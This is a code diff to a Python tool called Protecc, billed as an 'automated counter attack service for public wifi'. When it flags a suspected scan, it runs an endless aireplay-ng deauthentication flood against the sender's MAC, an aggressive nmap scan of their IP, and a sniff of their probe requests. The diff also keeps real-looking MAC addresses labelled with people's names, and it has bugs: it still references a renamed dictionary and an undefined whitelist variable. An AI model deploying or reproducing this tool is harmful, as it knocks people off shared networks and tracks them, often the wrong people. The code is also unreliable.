@@ -5,6 +5,7 @@ import socket
 import subprocess
 import sys
 import threading
+import time
 
 class Protecc:
 
@@ -12,9 +13,14 @@ class Protecc:
         self.internet = internet
         self.monitor = monitor
         self.sniffTime = sniffTime
-        # IP -> port -> freq
-        self.incomingIPs = {}
+        # MAC -> port -> freq
+        self.incomingMACs = {}
         self.blacklist = set()
+
+        # load whitelist
+        wl = open(whitelist, "r")
+        self.whitelist = wl.readlines()
+        print wl
 
     def receivePacket(self, pkt):
         if IP in pkt:
@@ -22,29 +28,29 @@ class Protecc:
                 srcIP = pkt[IP].src
                 srcMAC = pkt[Ether].src
                 dstPort = pkt[TCP].dport
-                if srcIP not in self.incomingIPs:
-                    self.incomingIPs[srcIP] = {}
-                    self.incomingIPs[srcIP][dstPort] = 1
-                else:
-                    if dstPort not in self.incomingIPs[srcIP]:
-                        self.incomingIPs[srcIP][dstPort] = 0
-                    self.incomingIPs[srcIP][dstPort] += 1
 
-                if srcIP not in self.blacklist:
-                    if len(self.incomingIPs[srcIP]) > 100:
+                if srcMAC not in self.incomingMACs:
+                    self.incomingMACs[srcMAC] = {}
+                    self.incomingMACs[srcMAC][dstPort] = 1
+                else:
+                    if dstPort not in self.incomingMACs[srcMAC]:
+                        self.incomingMACs[srcMAC][dstPort] = 0
+                    self.incomingMACs[srcMAC][dstPort] += 1
+
+                if srcMAC not in self.blacklist and srcMAC not in self.whitelist:
+                    if len(self.incomingIPs[srcMAC]) > 100:
                         print("potential nmap scan from " + srcIP + " (" + srcMAC + "); counterattacking")
-                        self.blacklist.add(srcIP)
+                        self.blacklist.add(srcMAC)
                         self.defend(srcMAC, srcIP)
-                    if self.incomingIPs[srcIP][dstPort] > 100:
+                    elif self.incomingIPs[srcMAC][dstPort] > 100:
                         print("brute force detected from " + srcIP + " (" + srcMAC + "); counterattacking")
-                        self.blacklist.add(srcIP)
+                        self.blacklist.add(srcMAC)
                         self.defend(srcMAC, srcIP)
 
     def defend(self, attackerMAC, attackerIP):
         # macAddress = "ac:37:43:a3:fd:6f" # eric phone
         # macAddress = "10:08:b1:6f:ef:bb" # robert
         # macAddress = "b8:e8:56:44:59:c4" # maurya
-
         self.setMonitorMode()
         routerMAC = self.findRouterMAC()
         self.logNmap(attackerIP)
@@ -69,14 +75,16 @@ class Protecc:
     def spamDeauthPackets(self, count, routerMAC, attackerMAC, interface):
         while True:
             subprocess.run(["aireplay-ng", "-0", str(count), "-a", routerMAC, "-c", attackerMAC, interface])
+            time.sleep(1)
 
     def logNmap(self, ip):
         subprocess.run(["nmap", "-A", "-oN", "nmap-" + ip + ".log", ip])
 
     def sniffProbeRequests(self, macAddress, sniffTime):
         subprocess.run("timeout " + str(sniffTime) + "s " \
-                       "python probemon.py -i " + self.monitor + " -o sneaks.log -t unix -fsrl | " \
-                       "grep --line-buffered " + macAddress + " > probeRequests.log", shell=True)
+                       "python probemon.py -i " + self.monitor + " -o sneaks-" + macAddress + ".log -t unix -fsrl | " \
+                       "grep --line-buffered " + macAddress + " > filteredSneaks-" + macAddress + ".log", shell=True)
+        print("probe sniffing on " + macAddress + " completed")
 
 DESCRIPTION = "Automated counter attack service for public wifi"
 
@@ -88,7 +96,7 @@ def main():
     parser.add_argument("-i", "--internet-interface", help="internet interface")
     parser.add_argument("-m", "--monitoring-interface", help="sniff + deauth interface")
     parser.add_argument("-o", "--output", help="result output location")
-    parser.add_argument("-s", "--sniffTime", help="how long to sniff for probe requests")
+    parser.add_argument("-s", "--sniffTime", default=60, help="how long to sniff for probe requests")
     parser.add_argument("-w", "--whitelist", help="MAC address whitelist (newline separated)")
     args = parser.parse_args()
 
